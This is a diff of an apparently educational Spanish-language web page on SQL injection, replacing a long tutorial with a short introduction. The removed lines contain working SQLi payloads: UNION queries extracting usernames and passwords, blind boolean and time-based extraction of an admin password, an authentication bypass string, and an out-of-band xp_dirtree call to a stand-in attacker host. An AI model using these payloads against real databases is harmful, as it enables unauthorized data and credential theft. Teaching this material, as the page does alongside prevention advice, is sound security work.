@@ -1,197 +1,53 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Theory - SQL Injection</title>
-    <link rel="stylesheet" href="../../style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Theory - SQL Injection</title>
+  <link rel="stylesheet" href="../../style.css">
 </head>
 <body>
+  <header>
+    <div id="global-header"></div>
+  </header>
 
-    <header>
-    <nav class="navbar global-nav">
-            <a href="../../index.html#index" class="nav-logo" id="nav-logo">
-                <span class="wave">🛡️</span> AppSec in a Nutshell
-            </a>
-            <ul>
-                <li class="dropdown">
-                    <a href="../../index.html#web-security-index" id="web-security-link"><span>🔒</span> Web Security</a>
-                    <ul class="dropdown-content">
-                        <li><a href="../../WebSecurity/xss/TheoryXSS.html" id="xss-link"><span>🧬</span> XSS</a></li>
-                        <li><a href="../../WebSecurity/sqlInjection/TheorySqli.html" id="sql-injection-link"><span>💾</span> SQL Injection</a></li>
-                    </ul>
-                </li>
-                <li><a href="../../index.html#devsecops"><span>⚙️</span> DevSecOps</a></li>
-                <li><a href="../../index.html#design-security"><span>🎨</span> Design and Security</a></li>
-            </ul>
-        </nav>
-    </header>
+  <main>
+    <div class="layout">
+      <aside class="sidebar">
+        <div id="sql-index"></div>
+      </aside>
 
-    <main>
-        <div class="layout">
-            <aside class="sidebar">
-                <div id="sql-index"></div>
-            </aside>
+      <div class="content-area">
+        <section class="card" id="intro">
+          <h2>1. Introducción y conceptos</h2>
+          <p>
+            SQL Injection (SQLi) es una vulnerabilidad que ocurre cuando una aplicación construye consultas SQL con entrada del usuario sin validarla o parametrizar correctamente. El atacante inyecta fragmentos de SQL para alterar la consulta original y obtener información, modificar datos o ejecutar comandos no previstos.
+          </p>
+          <h3>Tipos comunes</h3>
+          <ul>
+            <li><strong>In-band (clásico):</strong> los datos se obtienen por la misma ví­a (ej. UNION, error-based).</li>
+            <li><strong>Blind (ciegas):</strong> la aplicación no devuelve datos directamente - inferencia mediante respuestas booleanas o tiempos.</li>
+            <li><strong>Out-of-band (OAST):</strong> se usan canales externos (DNS, HTTP callbacks) para extraer datos.</li>
+          </ul>
+          <p>
+            Importante: hay diferencias entre motores (MySQL, PostgreSQL, MSSQL, Oracle) - sintaxis de funciones, comentarios, funciones de retardo y metaâ€‘tablas (p. ej., <code>information_schema</code>, <code>sysobjects</code>).
+          </p>
+        </section>
+      </div>
+    </div>
 
-            <div class="content-area">
-                <section class="card" id="intro-basics">
-                    <h2>1. Introducción y conceptos básicos</h2>
-                    <blockquote>
-                        Documento técnico y práctico pensado para pentesters, desarrolladores y equipos de seguridad. Profundiza en detección, explotación (incluido UNION y blind SQLi), y mitigación.
-                    </blockquote>
-                    <p><strong>SQL Injection (SQLi)</strong> ocurre cuando una aplicación construye consultas SQL con entrada del usuario sin parametrizar correctamente. El atacante puede alterar la consulta original para leer o modificar datos.</p>
-                    <ul>
-                        <li><strong>In-band (clásica):</strong> extracción por la misma vía (UNION, error-based).</li>
-                        <li><strong>Blind (ciegas):</strong> inferencia por respuestas booleanas o por tiempo.</li>
-                        <li><strong>Out-of-band (OAST):</strong> uso de canales externos (DNS/HTTP callbacks).</li>
-                    </ul>
-                    <p>Los motores (MySQL, PostgreSQL, MSSQL, Oracle) difieren en funciones, comentarios y meta-tablas (p. ej., <code>information_schema</code>, <code>sysobjects</code>).</p>
-                </section>
-
-                <section class="card" id="examinar-bd">
-                    <h2>2. SQL Injection — Examinando la base de datos</h2>
-                    <h3>1) Type & version</h3>
-                    <p>Conocer el motor facilita elegir payloads correctos.</p>
-                    <ul>
-                        <li>MySQL: <code>' UNION SELECT version()-- </code></li>
-                        <li>PostgreSQL: <code>' UNION SELECT version()-- </code></li>
-                        <li>MSSQL: <code>' UNION SELECT @@version-- </code></li>
-                    </ul>
-                    <h3>2) Listar tablas y columnas</h3>
-                    <pre><code>-- MySQL
-SELECT table_name FROM information_schema.tables WHERE table_schema=database();
-SELECT column_name FROM information_schema.columns WHERE table_name='users';
-
--- Enumeración vía UNION
-' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--</code></pre>
-                    <h3>3) Detección de vulnerabilidades</h3>
-                    <ul>
-                        <li>Probar comillas: <code>1'</code>; booleanos: <code>1' AND 1=1--</code> vs <code>1' AND 1=2--</code>.</li>
-                        <li>Comentarios: <code>--</code>, <code>#</code> (MySQL), <code>/* ... */</code>.</li>
-                        <li>Contextos: números (sin comillas), cadenas (cerrar comillas), <code>ORDER BY</code>, <code>LIMIT</code>.</li>
-                    </ul>
-                </section>
-
-                <section class="card" id="union-attacks">
-                    <h2>3. SQL Injection — ataques UNION</h2>
-                    <h3>Paso 1: Determinar número de columnas</h3>
-                    <pre><code>-- ORDER BY
-/product?id=1 ORDER BY 1--
-/product?id=1 ORDER BY 2--
-
--- UNION con NULLs
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL--
-</code></pre>
-                    <h3>Paso 2: Encontrar columnas visibles/útiles</h3>
-                    <p>Inyecta una cadena en cada posición para detectar dónde aparece en la página: <code>UNION SELECT 'a',NULL,NULL</code>.</p>
-                    <h3>Paso 3: Recuperar datos</h3>
-                    <pre><code>' UNION SELECT username, password FROM users--
--- Si hay más columnas, rellena con NULL: UNION SELECT username, NULL, password--
-</code></pre>
-                    <h3>Paso 4: Múltiples valores en una columna</h3>
-                    <pre><code>-- MySQL
-UNION SELECT CONCAT(username, ':', password) FROM users--
--- PostgreSQL
-UNION SELECT username || ':' || password FROM users--
--- Agregación
-UNION SELECT GROUP_CONCAT(username, ':', password) FROM users--
-</code></pre>
-                    <p><strong>Notas:</strong> usa <code>NULL</code> para casar tipos; castea a texto si el motor lo requiere.</p>
-                </section>
-
-                <section class="card" id="blind-sqli">
-                    <h2>4. Blind SQL Injection</h2>
-                    <h3>Boolean-based</h3>
-                    <pre><code>?id=1 AND (
-  SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin'
-)='a'--
-</code></pre>
-                    <h3>Error-based</h3>
-                    <pre><code>1' AND (
-  SELECT 1 FROM (
-    SELECT COUNT(*), CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2)) x
-    FROM information_schema.tables GROUP BY x
-  ) a
-)--
-</code></pre>
-                    <h3>Time-based</h3>
-                    <pre><code>-- MySQL
-?id=1' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0)--
--- PostgreSQL: pg_sleep(5)
--- MSSQL: WAITFOR DELAY '0:0:5'
-</code></pre>
-                    <h3>OAST</h3>
-                    <p>Uso de canales externos (DNS/HTTP callbacks) para exfiltración. Requiere que la BD pueda resolver nombres.</p>
-                </section>
-
-                <section class="card" id="prevenir-sqli">
-                    <h2>5. Cómo prevenir SQL Injection</h2>
-                    <ol>
-                        <li><strong>Consultas parametrizadas / Prepared Statements.</strong></li>
-                        <li><strong>ORMs</strong> (evita raw queries sin parámetros).</li>
-                        <li><strong>Validación / normalización</strong> de entrada (whitelists).</li>
-                        <li><strong>Escapado correcto</strong> si no hay parámetros (driver-specific).</li>
-                        <li><strong>Mínimo privilegio</strong> en la cuenta de BD.</li>
-                        <li><strong>Errores</strong> no detallados en producción.</li>
-                        <li><strong>WAF</strong> como defensa en profundidad.</li>
-                        <li><strong>Registro/monitorización</strong> de consultas anómalas.</li>
-                        <li><strong>Cifrado</strong> y hashing robusto (bcrypt/argon2).</li>
-                    </ol>
-                </section>
-
-                <section class="card" id="cheat-sheet">
-                    <h2>6. Cheat sheet (resumen rápido)</h2>
-                    <h3>Comentarios</h3>
-                    <ul>
-                        <li>MySQL: <code>-- </code> o <code>#</code> (nota: <code>-- </code> requiere espacio)</li>
-                        <li>MSSQL/Oracle: <code>--</code>; Multi-line: <code>/* ... */</code></li>
-                    </ul>
-                    <h3>Pruebas básicas</h3>
-                    <ul>
-                        <li><code>1' OR '1'='1'-- </code> (bypass)</li>
-                        <li><code>' OR 'x'='x</code> (boolean test)</li>
-                    </ul>
-                    <h3>Columnas y UNION</h3>
-                    <ul>
-                        <li><code>ORDER BY 1--</code>, <code>UNION SELECT NULL--</code>, etc.</li>
-                        <li>MySQL ejemplo: <code>-1' UNION SELECT null,version()-- </code></li>
-                    </ul>
-                    <h3>Blind</h3>
-                    <ul>
-                        <li>Boolean: <code>SUBSTRING(...)=...</code></li>
-                        <li>Time: <code>SLEEP(5)</code>, <code>pg_sleep(5)</code>, <code>WAITFOR DELAY</code></li>
-                    </ul>
-                    <h3>OAST</h3>
-                    <p>MSSQL: <code>exec master..xp_dirtree \\attacker.com\share</code></p>
-                </section>
-
-                <section class="card" id="referencias">
-                    <h2>7. Referencias</h2>
-                    <ul>
-                        <li>PortSwigger Web Security Academy — labs y guías de SQL Injection.</li>
-                        <li>OWASP Top 10 — Inyección SQL.</li>
-                        <li>Documentación de MySQL, PostgreSQL, Microsoft SQL Server, Oracle.</li>
-                    </ul>
-                    <hr>
-                    <p><em>Aviso legal:</em> Usa estas técnicas sólo con autorización expresa.</p>
-                </section>
-            </div>
-        </div>
-
-        <script src="../../loadHeader.js"></script>
-        <script src="../../sqliIndex.js"></script>
-        <script>
-            (async function(){
-                if(window.loadPartial){
-                    await window.loadPartial('sql-index','partials/sqlinjection-index.html');
-                    if(window.initSqliIndex) window.initSqliIndex();
-                }
-            })();
-        </script>
-    </main>
-
+    <script src="../../loadHeader.js"></script>
+    <script src="../../sqliIndex.js"></script>
+    <script>
+      (async function(){
+        if(window.loadHeader){ await window.loadHeader('global-header'); }
+        if(window.loadPartial){
+          await window.loadPartial('sql-index','partials/sqlinjection-index.html');
+          if(window.initSqliIndex) window.initSqliIndex();
+        }
+        // static intro; no fetch
+      })();
+    </script>
+  </main>
 </body>
 </html>
